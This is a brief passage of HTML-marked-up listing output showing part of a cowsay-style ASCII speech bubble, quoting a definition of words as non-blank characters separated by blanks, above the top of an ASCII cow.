-</span><span class='line'>| consists of sequences of non-blank      |
-</span><span class='line'>\ characters separated by blanks".        /
 </span><span class='line'> -----------------------------------------
 </span><span class='line'>        \   ^__^
 </span><span class='line'>         \  (oo)\_______
